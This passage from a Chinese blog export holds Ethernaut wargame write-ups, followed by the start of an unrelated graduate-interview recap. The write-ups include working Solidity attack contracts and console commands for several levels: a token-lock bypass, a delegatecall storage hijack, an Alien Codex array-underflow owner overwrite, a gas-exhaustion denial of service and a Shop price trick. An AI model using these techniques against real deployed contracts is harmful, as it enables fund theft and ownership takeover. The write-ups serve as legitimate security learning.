ERC-20\n标准中也没有通知接受合约所传入代币的机制。\n导致这一问题的主要原因包括：</p>\n<ol type=\"1\">\n<li>代币转移机制</li>\n</ol>\n<ul>\n<li>ERC-20 代币使用 transfer 或 transferFrom 函数进行转移\n<ul>\n<li>当用户使用这些函数将代币发送到合约地址时，无论接收合约是否是为处理它们而设计，代币都会被转移</li>\n</ul></li>\n</ul>\n<ol type=\"1\">\n<li>缺乏通知\n<ul>\n<li>接收合约不会收到已向其发送代币的通知或回调</li>\n<li>如果接收合约缺乏处理代币的机制（例如，回退函数或专门用于处理代币接收的函数），则代币实际上会卡在合约的地址中</li>\n</ul></li>\n<li>无内置处理\n<ul>\n<li>ERC-20\n标准不包含用于接收待实现合约的强制函数，导致许多合约无法正确管理传入的代币</li>\n</ul></li>\n</ol>\n<p>除了 ERC-20 ，这个题还有个转账限制，合约创建10年后才可以转账2333</p>\n<p>那我现在等十年回来再做（不是）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {</span><br><span class=\"line\">    super.transfer(_to, _value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这里还是看一下父类的实现。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function transfer(address to, uint256 value) public virtual returns (bool) {</span><br><span class=\"line\">    address owner = _msgSender();</span><br><span class=\"line\">    _transfer(owner, to, value);</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">function _transfer(address from, address to, uint256 value) internal {</span><br><span class=\"line\">    if (from == address(0)) {</span><br><span class=\"line\">        revert ERC20InvalidSender(address(0));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    if (to == address(0)) {</span><br><span class=\"line\">        revert ERC20InvalidReceiver(address(0));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    _update(from, to, value);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">function _update(address from, address to, uint256 value) internal virtual {</span><br><span class=\"line\">    if (from == address(0)) {</span><br><span class=\"line\">        // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class=\"line\">        _totalSupply += value;</span><br><span class=\"line\">    } else {</span><br><span class=\"line\">        uint256 fromBalance = _balances[from];</span><br><span class=\"line\">        if (fromBalance &lt; value) {</span><br><span class=\"line\">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        unchecked {</span><br><span class=\"line\">            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class=\"line\">            _balances[from] = fromBalance - value;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    if (to == address(0)) {</span><br><span class=\"line\">        unchecked {</span><br><span class=\"line\">            // Overflow not possible:</span><br><span class=\"line\">            // value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span><br><span class=\"line\">            _totalSupply -= value;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    } else {</span><br><span class=\"line\">        unchecked {</span><br><span class=\"line\">            // Overflow not possible: </span><br><span class=\"line\">            // balance + value is at most totalSupply, which we know fits into a uint256.</span><br><span class=\"line\">            _balances[to] += value;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    emit Transfer(from, to, value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>没看出啥漏洞啊？</p>\n<p>看来player是绕不过检测的，但是其他合约是不走这个检测的。</p>\n<p>我可以让其他合约给 address(0) 发送\n<code>1000000 * (10 ** uint256(decimals()))</code>\n个货币，整个合约就没钱了？不对，因为直接用 transfer 不能给 address(0)\n发。</p>\n<p>是不是有其他的我可以调用的函数，绕过这个 transfer ？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {</span><br><span class=\"line\">    address spender = _msgSender();</span><br><span class=\"line\">    _spendAllowance(from, spender, value);</span><br><span class=\"line\">    _transfer(from, to, value);</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">function _spendAllowance(address owner, address spender, uint256 value) internal virtual {</span><br><span class=\"line\">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class=\"line\">    if (currentAllowance &lt; type(uint256).max) {</span><br><span class=\"line\">        if (currentAllowance &lt; value) {</span><br><span class=\"line\">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        unchecked {</span><br><span class=\"line\">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {</span><br><span class=\"line\">    if (owner == address(0)) {</span><br><span class=\"line\">        revert ERC20InvalidApprover(address(0));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    if (spender == address(0)) {</span><br><span class=\"line\">        revert ERC20InvalidSpender(address(0));</span><br><span class=\"line\">    }</span><br><span class=\"line\">    _allowances[owner][spender] = value;</span><br><span class=\"line\">    if (emitEvent) {</span><br><span class=\"line\">        emit Approval(owner, spender, value);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>发现个新概念，<strong>授权和转移</strong></p>\n<p><strong>授权和转移</strong>：transferFrom 是 ERC-20\n的授权机制的一部分。当用户调用 approve\n函数授权某个地址（比如一个智能合约）在一定额度内代为转移代币时，其他地址（通常是智能合约或第三方）可以通过调用\ntransferFrom 来转移这些代币。</p>\n<p>所以我可以给一个智能合约授权我的所有货币，然后让智能合约调用\ntranferFrom 帮我把钱花掉。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title function_\">approve</span>(<span class=\"string\">\"0x6Aeb10F5b34A3553f57eAd90D3e2B5D7f0F52bEd\"</span>, <span class=\"number\">1000000000000000000000000n</span>)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack {</span><br><span class=\"line\">    address public target;</span><br><span class=\"line\">    constructor(address _target) {</span><br><span class=\"line\">        target = _target;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function transferAll() external payable {</span><br><span class=\"line\">        (bool success, bytes memory returnData) = address(target).call(</span><br><span class=\"line\">            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", address(msg.sender), address(this), 1000000 * (10 ** uint256(18)))</span><br><span class=\"line\">        );</span><br><span class=\"line\">        require(success, \"Call failed\");</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Gatekeeper Two","url":"/ethernaut/15-Gatekeeper-Two/","content":"<p>第二题，差不多，就是有个汇编代码关键字。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">assembly {</span><br><span class=\"line\">    x := extcodesize(caller())</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li>extcodesize(address)是用于返回地址的字节码长度\n<ul>\n<li>如果是合约，字节码长度非零</li>\n<li>如果是账户，字节码长度为零</li>\n</ul></li>\n<li>caller() 就是 msg.sender；</li>\n</ul>\n<p>这就有点奇怪了啊？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">modifier gateOne() {</span><br><span class=\"line\">    require(msg.sender != tx.origin);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">modifier gateTwo() {</span><br><span class=\"line\">    uint256 x;</span><br><span class=\"line\">    assembly {</span><br><span class=\"line\">        x := extcodesize(caller())</span><br><span class=\"line\">    }</span><br><span class=\"line\">    require(x == 0);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">modifier gateThree(bytes8 _gateKey) {</span><br><span class=\"line\">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>既要发送者是账户，又要经过合约转发？</p>\n<p>绕过gateTwo的方法是，合约在创建阶段，字节码长度还是0；所以在构造函数里调用就可以了。</p>\n<p>第三问一个简单的位运算。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    constructor(address _target) {</span><br><span class=\"line\">        GatekeeperTwo gk = GatekeeperTwo(_target);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));</span><br><span class=\"line\">        gk.enter(key);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Preservation","url":"/ethernaut/17-Preservation/","content":"<p>核心是里用 delegatecall 来进行攻击。</p>\n<p>首先需要补充一下 abi 的各个函数的作用。</p>\n<span id=\"more\"></span>\n<h1 id=\"abi模块\">abi模块</h1>\n<p>图片中列出的 <code>abi</code> 模块的方法是 Solidity 和 EVM\n编码中常用的方法，主要用于对数据的编码和解码。以下是它们的作用解释：</p>\n<h3 id=\"abi.decode\">1. <strong><code>abi.decode</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>: 用于解码通过 ABI 编码的字节数据。</p></li>\n<li><p><strong>签名</strong>:\n<code>decode(bytes encodedData, (...)) returns (...)</code></p></li>\n<li><p><strong>使用场景</strong>: 如果你从合约中获取了编码的字节数据（如\n<code>bytes</code> 类型），你可以用 <code>abi.decode</code>\n来还原它为原始的数据类型。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory data = abi.encode(\"Hello\", 123);</span><br><span class=\"line\">(string memory str, uint256 num) = abi.decode(data, (string, uint256));</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"abi.encode\">2. <strong><code>abi.encode</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>: 对数据进行 ABI\n编码，返回一个字节数组。</p></li>\n<li><p><strong>签名</strong>:\n<code>encode(...) returns (bytes)</code></p></li>\n<li><p><strong>使用场景</strong>: 在 Solidity\n中生成适合合约交互的输入数据，或创建自定义的数据格式。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory data = abi.encode(\"Hello\", 123);</span><br><span class=\"line\">// data 包含两个参数编码后的字节数据</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"abi.encodecall\">3.\n<strong><code>abi.encodeCall</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>:\n对函数调用进行编码，包含函数选择器和参数。</p></li>\n<li><p><strong>签名</strong>:\n<code>encodeCall(function, (...)) returns (bytes)</code></p></li>\n<li><p><strong>使用场景</strong>:\n用于准备合约方法调用的字节数据，适合低层次合约调用（如\n<code>call</code>）。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory data = abi.encodeCall(myContract.myFunction, (arg1, arg2));</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"abi.encodepacked\">4.\n<strong><code>abi.encodePacked</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>: 进行紧凑编码，不包含 32\n字节对齐填充。</p></li>\n<li><p><strong>签名</strong>:\n<code>encodePacked(...) returns (bytes)</code></p></li>\n<li><p><strong>使用场景</strong>: 用于生成哈希（如\n<code>keccak256</code>）或减少存储占用，但需小心避免哈希碰撞。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory packed = abi.encodePacked(\"Hello\", uint8(123));</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"abi.encodewithselector\">5.\n<strong><code>abi.encodeWithSelector</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>:\n对函数选择器和参数进行编码，返回包含函数选择器的字节数据。</p></li>\n<li><p><strong>签名</strong>:\n<code>encodeWithSelector(bytes4 selector, (...)) returns (bytes)</code></p></li>\n<li><p><strong>使用场景</strong>:\n手动设置函数选择器并编码数据，用于合约交互。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory data = abi.encodeWithSelector(myContract.myFunction.selector, arg1, arg2);</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"abi.encodewithsignature\">6.\n<strong><code>abi.encodeWithSignature</code></strong></h3>\n<ul>\n<li><p><strong>作用</strong>:\n根据函数签名和参数进行编码，返回包含函数选择器的字节数据。</p></li>\n<li><p><strong>签名</strong>:\n<code>encodeWithSignature(string signature, (...)) returns (bytes)</code></p></li>\n<li><p><strong>使用场景</strong>:\n当函数签名已知时，用于生成与目标合约交互所需的编码数据。</p></li>\n<li><p>示例:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytes memory data = abi.encodeWithSignature(\"myFunction(uint256,string)\", 123, \"Hello\");</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<hr>\n<h3 id=\"区别总结\">区别总结：</h3>\n<table>\n<colgroup>\n<col style=\"width: 28%\">\n<col style=\"width: 46%\">\n<col style=\"width: 25%\">\n</colgroup>\n<thead>\n<tr>\n<th><strong>函数</strong></th>\n<th><strong>主要用途</strong></th>\n<th><strong>是否包含函数选择器</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>abi.decode</code></td>\n<td>解码数据</td>\n<td>不适用</td>\n</tr>\n<tr>\n<td><code>abi.encode</code></td>\n<td>标准 ABI 编码</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>abi.encodeCall</code></td>\n<td>函数调用编码（函数选择器 + 参数）</td>\n<td>是</td>\n</tr>\n<tr>\n<td><code>abi.encodePacked</code></td>\n<td>紧凑编码（无 32 字节对齐）</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>abi.encodeWithSelector</code></td>\n<td>自定义函数选择器编码（函数选择器 + 参数）</td>\n<td>是</td>\n</tr>\n<tr>\n<td><code>abi.encodeWithSignature</code></td>\n<td>使用函数签名直接编码（函数选择器 + 参数）</td>\n<td>是</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"delegatecall如何对应存储\">delegatecall如何对应存储？</h1>\n<p>delegatecall不是不会切换上下文嘛，就是如果调用的函数里设置了一个Storage，但是修改的是调用合约对应的Storage。我有个问题，比如目标函数里修改了storedTime这个Storage，调用函数怎么找到对应的Storage？</p>\n<ul>\n<li>Solidity 合约中的状态变量会映射到特定的存储槽（Storage\nSlots），这些存储槽是根据变量声明的顺序确定的。</li>\n<li>当目标函数通过 delegatecall\n被调用时，所有的存储访问（读或写）都会指向调用合约的存储槽，而不是目标合约的存储槽。</li>\n</ul>\n<p>存储槽式通过偏移量来确定的。所以，delegatecall的目标合约，必须和调用合约的内存分布完全一致！</p>\n<p>这个题的问题就找到了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    uint256 storedTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setTime(uint256 _time) public {</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>然后调用两次\nsetFirstTime，第一次把timeZone1Library设置为攻击合约，第二次用攻击合约修改owner。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title function_\">setFirstTime</span>(<span class=\"title class_\">AttackContract</span>.<span class=\"property\">address</span>)</span><br><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title function_\">setFirstTime</span>(<span class=\"title class_\">AttackContract</span>.<span class=\"property\">address</span>)</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Recovery","url":"/ethernaut/18-Recovery/","content":"<p>过半了，快做完了。</p>\n<p>一个合约创建者构建了一个非常简单的代币工厂合约。任何人都可以轻松创建新的代币。在部署第一个代币合约后，创建者发送了0.001以太币以获得更多的代币。此后，他们失去了合约地址。如果可以从丢失的合约地址中恢复（或删除）0.001以太币，则此级别将完成。</p>\n<span id=\"more\"></span>\n<p>重点是，核心是区块链上的所有交易都是有记录的……在区块链浏览器里找一下就找到了。</p>\n<p>但是感觉有点作弊，这题应该是想让我们了解智能合约的地址是怎么创建的。</p>\n<p>这题的提示更有意思，因为智能合约创建的地址是可预测的，可以提前给这个地址发一些以太币，然后再在这个地址上创建智能合约，智能合约初始就拿到了这隐藏的钱。</p>\n<p><strong>创建者地址</strong>：这是部署合约的账户的地址（通常是外部拥有账户EOA的地址）。</p>\n<p><strong>Nonce</strong>：这是该地址已发送交易的数量，表示该地址的交易计数器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">address = keccak256(RLP(创建者地址 + nonce))[12:]</span><br></pre></td></tr></table></figure>\n<p>RLP 表示对数据进行 <strong>递归长度前缀编码</strong>（RLP\nEncoding）。即对创建者地址和nonce进行编码。</p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - MagicNumber","url":"/ethernaut/19-MagicNumber/","content":"<p>创建一个10字节的智能合约……</p>\n<span id=\"more\"></span>\n<p>这题要学会怎么写原生的EVM字节码。</p>\n<p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p>\n<p>这个暂时不展开学习了，肯定得花一些时间。可以参考上面这个详细教程。</p>\n<p>另外发现了好玩的：教你EVM字节码的游戏https://stermi.xyz/blog/lets-play-evm-puzzles</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">sendTransaction</span>({<span class=\"attr\">from</span>:player,<span class=\"attr\">data</span>:<span class=\"string\">\"0x600a600c600039600a6000f3602A60805260206080f3\"</span>});</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Alien Codex","url":"/ethernaut/20-Alien-Codex/","content":"<p>和外星人交流，获得owner权。</p>\n<span id=\"more\"></span>\n<p>思路就是先找哪里有可以攻击的地方。这个函数，可以修改一个数组中的值，我只要让codex[i]对应的内存空间位置变成\nowner 的位置即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function revise(uint256 i, bytes32 _content) public contacted {</span><br><span class=\"line\">    codex[i] = _content;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>动态数组，slot里存数组长度，keccak256(slot) + i\n的值就是第i个元素的槽位。</p>\n<p>计算出 <code>keccak256(slot) + i</code> 在什么时候 = 0。</p>\n<p>slot[0] 里存两个值 contracted 和 owner</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x000000000000000000000001_0bc04aa6aac163a6b3667636d798fa053d43bd11</span><br></pre></td></tr></table></figure>\n<p>只要把slot改成我的地址即可：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x000000000000000000000000_E484608fA7639996d0F359f76f34DF9fe15f7F7B</span><br></pre></td></tr></table></figure>\n<p>还有设置数组会检测数组长度，所以先让他下溢，把数组长度开满。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">await</span> contract.<span class=\"title function_\">retract</span>() <span class=\"comment\">// 下溢让数组长度爆了</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    address public target;</span><br><span class=\"line\">    uint256 public log;</span><br><span class=\"line\">    constructor(address _target) {</span><br><span class=\"line\">        target = _target;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public {</span><br><span class=\"line\">        AlienCodex codex = AlienCodex(target);</span><br><span class=\"line\">        uint256 i = (~uint256(0)) - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class=\"line\">        codex.revise(i, 0x000000000000000000000000E484608fA7639996d0F359f76f34DF9fe15f7F7B);</span><br><span class=\"line\">    } </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Denial","url":"/ethernaut/21-Denial/","content":"<p>这是一个简单的钱包，随着时间的推移会慢慢滴出资金。你可以通过成为提取合作伙伴来慢慢提取资金。如果你能在所有者调用\nwithdraw（） 时拒绝他们提取资金（当合约仍有资金，且交易费用为1M\ngas或更少）时，你将赢得这一级别。</p>\n<span id=\"more\"></span>\n<p>不能用重入攻击提取完所有资金，因为要求合约有资金但是不能被提取，而且有\ngas 限制。</p>\n<p>想多了，就是消耗完gas就行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface IDenial {</span><br><span class=\"line\">    function withdraw() external;</span><br><span class=\"line\">    function setWithdrawPartner(address _partner) external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Denial {</span><br><span class=\"line\">    address levelInstance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _levelInstance) {</span><br><span class=\"line\">        levelInstance = _levelInstance;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    receive()  external payable {</span><br><span class=\"line\">        IDenial(levelInstance).withdraw();</span><br><span class=\"line\">        int sum = 0;</span><br><span class=\"line\">        for (int i = 0; i &lt; 100000; i++) {</span><br><span class=\"line\">            sum += i;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public payable {</span><br><span class=\"line\">        payable(msg.sender).transfer(address(this).balance);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Shop","url":"/ethernaut/22-Shop/","content":"<p>花更少的前买东西。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Buyer {</span><br><span class=\"line\">    function price() external view returns (uint256);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Shop {</span><br><span class=\"line\">    uint256 public price = 100;</span><br><span class=\"line\">    bool public isSold;</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public {</span><br><span class=\"line\">        Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) {</span><br><span class=\"line\">            isSold = true;</span><br><span class=\"line\">            price = _buyer.price();</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这跟上次一样啊？第一次调用返回1000，第二次调用返回100；</p>\n<p>噢，等等，这次设置了 price 是 view 函数，不能修改状态。</p>\n<p>但是也有办法，我们可以看gas来判断是第一次还是第二次。</p>\n<p>又想复杂了，shop的isSold是public 的……</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">interface IShop {</span><br><span class=\"line\">    function isSold() external view returns (bool);</span><br><span class=\"line\">    function buy() external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Buyer {</span><br><span class=\"line\">    address levelInstance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _levelInstance) {</span><br><span class=\"line\">        levelInstance = _levelInstance;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function price() public view returns (uint256) {</span><br><span class=\"line\">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public {</span><br><span class=\"line\">        IShop(levelInstance).buy();</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Dex","url":"/ethernaut/23-Dex/","content":"<p>分布式交易合约，偷光所有钱。感觉有点同质化了，没啥意思）</p>\n<span id=\"more\"></span>\n<p>swapAmount 是用 IERC20 算的，</p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"浙软夏令营卓越营员面试复盘","url":"/interview/%E6%B5%99%E8%BD%AF%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8D%93%E8%B6%8A%E8%90%A5%E5%91%98%E9%9D%A2%E8%AF%95/","content":"<p>参加了浙软的面试，抽签抽到倒数第二个……在门口等了五个小时，非常热……</p>\n<p>记录一下面试的内容，整理了一下经验。</p>\n<p>整体来说老师的问题很有含金量很有启发性，没有一个水问题。</p>\n<p>也暴露了我专业课准备不充分的问题。</p>\n<p>之前完全没想到，会问这么多软件工程的专业问题，老师最感兴趣的尽然是济星云……</p>\n<p>与我准备的内容大相径庭2333我只能尽量的说，感觉大错是没有的，个别题目回答不流利，让人感觉基础不扎实</p>\n<span id=\"more\"></span>\n<h1 id=\"面试内容复盘\">面试内容复盘</h1>\n<p>刚开始是一个很和蔼的老师，笑呵呵的，坐在正中间：</p>\n<ol type=\"1\">\n<li><p><strong>济星云和你名字一样，是为什么</strong></p>\n<p>热场小问题，开玩笑，讲讲就过去了</p></li>\n<li><p><strong>ChatGLM和llama的区别</strong></p>\n<p>因为我讲了一下人工智能算法精英赛，项目做的是大语言模型</p>\n<p>但是真的不会，我直接说不是做大语言模型方向的，确实不了解</p></li>\n</ol>\n<p>然后换了一个最边上的老师，应该是负责软件工程的。</p>\n<ol type=\"1\">\n<li><p><strong>你的第一个项目，这个需求是真实的吗</strong></p>\n<p>这个项目就是夏令营做的《基于分布式数字身份的电影院售票系统》</p>\n<p>电影院的背景是强行加上去的，本身就不是实际的需求</p>\n<p>他讲了一些需求要从实际出发之类的问题，我频频点头2333</p></li>\n<li><p><strong>济星云中的需求是怎么来的</strong></p>\n<p>一开始是组内大家自己根据日常需要提出的，之后有反馈和建议渠道，收集+评审，确定新需求</p>\n<p>追问，反馈渠道获得的需求都做吗？有什么其他的判断标准吗？（表述不太准确）</p>\n<p>我总结一下就是说这样不会导致这个项目很臃肿吗？（其实我觉得济星云确实是个有点臃肿的项目……）</p></li>\n<li><p><strong>如何审查反馈渠道提供的需求</strong></p>\n<p>我回答，会再由产品组的同学审核一遍，判断是不是真的有需求，有没有必要加到我们的小程序里，有些也会做问卷征集意见。</p>\n<p>老师追问，能举一个例子，有哪些需求被舍弃了</p></li>\n<li><p><strong>有哪些需求被舍弃了</strong></p>\n<p>我举了乌龙茶（实际上没有被舍弃，脑子一空）</p>\n<p>我说是在上面进行课程评价、老师评价的一个需求</p>\n<p>但是我们担心可能有同学会在上面发表一些过激言论，而且已经有了一些相同功能的产品</p>\n<p>老师补充比如学校的什么官网，我说对</p></li>\n<li><p><strong>你觉得什么是软件工程</strong></p>\n<p>……扯了一点是一个保证项目稳定开发的方法（类似这样的）</p></li>\n<li><p><strong>济星云的团队有多少人</strong></p>\n<p>我说产品组和研发组都有30~40人，（可能其实还更多）</p>\n<p>他就问这真的需要这么多人吗</p>\n<p>我说这是一个给同学们练手的平台，没有什么成本……</p>\n<p>他打断，交流也是成本，然后开始问下一个问题</p></li>\n<li><p><strong>如何管理团队，保证产品的开发效率和质量</strong></p>\n<p>我说一个大型团队会根据项目分成多个小组，每组七八个人，每个小组有一个负责人</p>\n<p>他总结，一个两层的架构。追问，是如何分组的？</p>\n<p>我说根据项目需求分组的，每一个需求会拉一个群</p>\n<p>然后隔两三天定期进行沟通，跟踪进度。</p>\n<p>质量的话最后会有一个星期的测试环节，由团队里的同学们进行测试。</p>\n<p>他又追问：</p></li>\n<li><p><strong>上过软件测试的课吗？有什么软件测试方法</strong></p>\n<p>我说白盒黑盒……然后这里愣了很久，突然忘了里面具体的测试方法了（黑盒有等价类，边界值，判定表……白盒有各种路径覆盖）</p>\n<p>这里很尴尬，我